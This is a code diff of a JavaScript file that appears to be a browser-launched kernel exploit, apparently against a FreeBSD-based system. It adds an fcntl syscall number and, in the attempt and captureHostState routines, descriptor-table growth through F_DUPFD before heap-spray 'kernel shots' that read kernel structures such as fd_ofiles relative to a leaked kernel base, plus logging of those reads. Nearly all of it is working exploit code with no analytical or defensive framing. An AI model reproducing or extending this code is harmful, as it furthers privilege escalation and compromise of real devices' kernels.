@@ -29,7 +29,8 @@ const DEBUG_BIN = {
 const CANDIDATE_READY = true;
 
 const S = {
-  read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
+  read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, fcntl: 92,
+  socket: 97, setsockopt: 105,
   getuid: 24, kqueue: 362, kevent: 363, mmap: 477, lseek: 478, thr_self: 432,
   getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
   cpuset_setaffinity: 488,
@@ -555,6 +556,11 @@ async function captureHostState(shot, kbase, probe, reach, hostPage) {
     const ofiles = qAt(fdHeader, 0);
     const capacity = fdHeader.dv.getInt32(0x28, true);
     const lastfile = fdHeader.dv.getInt32(0x38, true);
+    say("[3] fd header ofiles=" + text(ofiles) + " capacity=" + capacity +
+      " lastfile=" + lastfile + " probe=" + probe);
+    /* The snapshot is taken while 126 temporary spray sockets are open.
+       Keep spare capacity for the next shot, then re-read fd_ofiles live
+       before following the probe descriptor. */
     if (!inHeap(ofiles) || (ofiles.low & 7) !== 0 ||
         capacity <= 0 || capacity > 0x10000 ||
         lastfile < probe || lastfile >= capacity || capacity - lastfile < 200)
@@ -1344,6 +1350,21 @@ async function attempt(ctx, opts) {
     if (probe >= 0) node = PROBE_NODES[i];
   }
   if (probe < 0) { say("[2] no device node opened for the probe descriptor"); return false; }
+
+  /* Grow the descriptor table before capturing fd_ofiles. F_DUPFD only
+     adds a reference to the probe file and does not create another file
+     object. Requiring fd >= 768 guarantees at least 769 table slots before
+     the staged reads; the header check below still enforces 200 spare. */
+  const grown = sc(S.fcntl, probe, 0, 768).i32;
+  if (grown < 768 || grown > 0xffff) {
+    say("[2] could not reserve descriptor-table capacity; no more kernel shots");
+    return false;
+  }
+  if (sc(S.close, grown).i32 !== 0) {
+    say("[2] could not close capacity-reservation descriptor; no more kernel shots");
+    return false;
+  }
+  say("[2] descriptor table was expanded with temporary fd " + grown);
 
   for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
     if (rd4(plus(hostFree, off)) !== 0) {
